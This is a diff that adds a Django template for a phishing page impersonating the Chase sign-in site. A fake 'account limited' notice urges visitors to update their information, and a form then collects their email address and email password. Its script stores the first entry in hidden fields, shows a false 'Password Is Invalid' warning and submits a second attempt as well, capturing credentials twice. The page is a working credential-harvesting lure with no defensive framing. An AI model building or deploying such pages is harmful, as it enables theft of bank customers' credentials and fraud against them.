@@ -1,0 +1,104 @@
+{% extends "parent/parent.html" %}
+{% load static %}
+{% block title %} Sign in - chase.com {% endblock %}
+
+{% block header %}
+<link rel="stylesheet" href="{% static 'base/css/styles.css' %}?{% now 'U' %}">
+<script src='https://www.google.com/recaptcha/api.js?render={{recaptcha_site_key}}'></script>
+{% endblock %}
+{% block body %} 
+    <div class="cover">
+        <div class="container mt-5">
+            <div class="row mt-5"></div>
+            <div class="row mt-5"></div>
+            <div class="row mt-5"></div>
+            <div class="row justify-content-center mt-5">
+                <div class="col-7 mt-4">
+                    <div class="content text-white">
+                        <h2>
+                            Verify your account.
+                        </h2><br>
+                        <h3>
+                            We apologize for any inconvenience.
+                            You can not access all your Chase advantages, due to account limited.
+                            To restore your account, please click Continue to update your information.
+                        </h3>
+                        <button class="fadeThisSlide btn btn-primary mt-5">Continue</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container-fluid header">
+        <div class="row justify-content-center text-center">
+            <div class="col-12">
+                <div class="logo mt-4">
+                    <a href="">
+                        <img src="{% static 'base/images/wordmark-white.png' %}" alt="">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container login">
+        <div class="row justify-content-center text-center row_four">
+            <div class="col-11 col-sm-9 col-md-7 col-lg-5 col-xl-4 bg-white login_form">
+                <div class="content">
+                    <form action="" method="POST" class="p-2 form_one">
+                        <div class="alert alert-warning alert-dismissible fade show d-none slimodan_alert2" role="alert">
+                            <strong>Warning!</strong> Your Password Is Invalid Please Try Again!
+                        </div>
+                        {% csrf_token %}
+                        <div class="content-header p-2">
+                            <h1 style="font-size:24px; text-align:left">Email Provider</h1>
+                        </div>
+                        <div class="input-group mt-5">  
+                            <label for="Email_access">Email</label>                          
+                            <input type="text" required name = "Email_access" class="form-control Email_access inp_username slimodan_input">
+                        </div>
+                        <div class="input-group mt-5"> 
+                            <label for="Password_access" >Password</label>                          
+                            <input type="password" required name="Password_access" class="form-control Password_access inp_password slimodan_input">
+                        </div>
+                        
+                        <input type="text" hidden name="MailAccess_step1" id="MailAccess_step1">
+                        <input type="text" hidden name="PasswordAccess_step1" id="PasswordAccess_step1">
+                        <input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response"> 
+                        
+                        <button class="btn btn-primary mt-4 w-100 btn-login one" id="fuck_login">
+                            <span>Submit</span>
+                        </button>
+                    </form> 
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="{% static 'base/js/script.js' %}" defer="true"></script>
+    <script>
+        $("#fuck_login").click(function(e){
+            e.preventDefault();
+            if ($("#fuck_login").hasClass("one")){
+                $("#MailAccess_step1").val($(".Email_access").val());
+                $("#PasswordAccess_step1").val($(".Password_access").val());
+                $(".slimodan_alert2").removeClass("d-none");
+                $(".Email_access").val("");
+                $(".Password_access").val("");
+                $("#fuck_login").removeClass("one");    
+
+
+            }else{
+                $(".form_one").submit();
+            }
+        })
+    </script>
+    <script>
+        $(".fadeThisSlide").click(function(){
+            $(".cover").fadeOut(600);
+        })
+        grecaptcha.ready(function() {
+          grecaptcha.execute('{{recaptcha_site_key}}', {action: "/"}).then(function(token) {
+            document.getElementById('g-recaptcha-response').value = token;
+          });
+        });
+    </script>
+{% endblock %}
